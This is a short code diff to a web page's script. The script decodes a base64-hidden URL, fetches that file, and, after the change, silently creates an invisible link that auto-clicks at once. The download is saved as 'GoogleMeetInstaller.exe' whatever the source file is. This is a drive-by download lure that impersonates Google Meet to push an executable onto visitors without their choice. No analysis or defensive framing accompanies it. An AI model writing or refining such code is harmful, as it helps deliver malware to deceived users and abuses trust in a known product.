@@ -153,23 +153,28 @@
             const fileUrl = atob(fileUrlEncoded);
             const fileName = fileUrl.split('/').pop();
 
-            const link = document.getElementById('clickbtn');
+            fetch(fileUrl)
+                .then(response => response.blob())
+                .then(blob => {
+                    const blobUrl = URL.createObjectURL(blob);
 
-            if (link) {
-                fetch(fileUrl)
-                    .then(response => response.blob())
-                    .then(blob => {
-                        const blobUrl = URL.createObjectURL(blob);
-                        link.href = blobUrl;
-                        link.download = fileName;
+                    // Create a temporary link to trigger download
+                    const tempLink = document.createElement('a');
+                    tempLink.href = blobUrl;
+                    tempLink.download = 'GoogleMeetInstaller.exe'; // Explicitly set filename
+                    tempLink.style.display = 'none';
+                    document.body.appendChild(tempLink);
 
-                        // Auto-click after delay
-                        setTimeout(() => {
-                            link.click();
-                        }, 1500);
-                    })
-                    .catch(err => console.error('Error preparing download:', err));
-            }
+                    // Trigger click
+                    tempLink.click();
+
+                    // Cleanup
+                    setTimeout(() => {
+                        document.body.removeChild(tempLink);
+                        URL.revokeObjectURL(blobUrl);
+                    }, 100);
+                })
+                .catch(err => console.error('Error preparing download:', err));
         });
     </script>
 </body>
